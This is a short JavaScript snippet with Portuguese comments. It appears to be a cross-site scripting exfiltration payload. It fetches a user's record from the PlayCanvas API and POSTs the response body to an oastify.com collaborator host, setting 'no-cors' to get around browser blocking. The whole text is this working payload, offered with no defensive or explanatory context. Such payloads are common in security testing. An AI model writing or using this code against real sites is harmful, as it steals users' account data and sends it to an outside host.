fetch("https://playcanvas.com/api/users/shisco")
  .then(r => r.text()) // ou .json() se preferir enviar JSON puro
  .then(data => {
    fetch("https://i9s0o50prcnjffe3sa6ci2h70y6pugi5.oastify.com", {
      method: "POST",
      mode: "no-cors", // evita bloqueio CORS
      body: data
    });
  });
